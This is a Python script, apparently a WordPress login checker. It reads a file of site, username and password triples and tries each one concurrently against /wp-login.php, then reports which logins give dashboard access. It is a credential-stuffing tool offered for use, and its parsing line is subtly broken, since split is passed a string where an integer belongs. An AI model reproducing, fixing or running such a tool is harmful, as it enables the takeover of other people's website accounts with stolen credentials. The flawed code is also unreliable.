import aiohttp
import asyncio
import os
import socket
import sys
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
from colorama import Fore, Style, init
from platform import system
green = Fore.GREEN
red = Fore.RED
ra = Style.RESET_ALL

try :
    import aiohttp
except ImportError :
    print("Please install aiohttp [!]\n\t pip install aiohttp")


def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')

def banners():
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    print(Fore.RED + f"════════════════════════════════════")
    print(Fore.LIGHTGREEN_EX + f"     [ WORDPRESS LOGIN ]")
    print(Fore.RED + f"════════════════════════════════════")
    print(Fore.RED + f"[ ! ]{Fore.RESET} Author: {Fore.LIGHTRED_EX}MELEDAKCIK {Fore.LIGHTGREEN_EX}EST - 2023")
    print(f"{Fore.GREEN}[ {Fore.RED}! {Fore.GREEN}]{Fore.RESET} Device: {host_name}")
    print(f"{Fore.GREEN}[ {Fore.RED}! {Fore.GREEN}]{Fore.RESET} Host  : {ip_address}")
    print(Fore.RED + f"═══════════════════════════════════")


async def check_login(link, user_id, password):
    async with aiohttp.ClientSession() as session:
        login_url = link + "/wp-login.php"
        async with session.post(login_url, data={'log': user_id, 'pwd': password}) as response:
            if response.status == 200:
                dashboard_url = link + "/wp-admin/"
                async with session.get(dashboard_url) as dashboard_response:
                    if dashboard_response.status == 200 and 'wp-admin-bar' in await dashboard_response.text():
                        print(f"Valid - {link} | {user_id} | {password}")
                    else:
                        print(f"Invalid - {link} | {user_id} | {password}")
            else:
                print(f"Invalid - {link} | {user_id} | {password}")


async def main():
    clear()
    banners()
    prints(
        Panel.fit(
            "[bold white]Dalam File Harus cth : [bold green]'link|username|password'[bold white] atau [bold green]'link,username,password'[bold] ",
            style="bold green"))
    file_name = input("Masukkan nama file: ")
    try:
        with open(file_name) as file:
            akun_list = file.readlines()
    except FileNotFoundError:
        print("File tidak ditemukan.")
        return

    tasks = []
    for akun in akun_list:
        link, user_id, password = akun.strip().split(',','|')
        task = asyncio.create_task(check_login(link, user_id, password))
        tasks.append(task)

    await asyncio.gather(*tasks)

asyncio.run(main())
